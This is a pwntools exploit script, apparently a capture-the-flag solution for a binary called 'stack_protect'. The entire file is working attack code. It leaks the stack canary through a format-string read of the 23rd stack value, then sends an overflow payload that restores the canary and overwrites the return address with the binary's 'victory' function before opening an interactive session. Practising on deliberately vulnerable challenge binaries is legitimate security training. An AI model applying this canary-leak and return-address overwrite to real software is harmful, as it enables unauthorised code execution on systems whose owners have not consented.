from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Set up pwntools for the correct architecture
exe = './stack_protect'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

offset = 64  # Canary offset 0x50 - 0x10 = 0x40 => 64bytes

# Leak canary value (23rd on stack)
io.sendlineafter(b':', '%{}$p'.format(23).encode())
io.recvline()  # Blank line
canary = int(io.recvline().strip(), 16)
info('canary = 0x%x (%d)', canary, canary)

# Build payload (ret2victory)
payload = flat([
    offset * b'A',  # Pad to canary (64)
    canary,  # Our leaked canary (4)
    12 * b'A',  # Pad to Ret pointer (12) 0x10 - 0x4 = 0xC => 12 bytes
    elf.symbols.victory  # ret2victory
])

# Send the payload
io.sendlineafter(b':', payload)

# Get our flag/shell
io.interactive()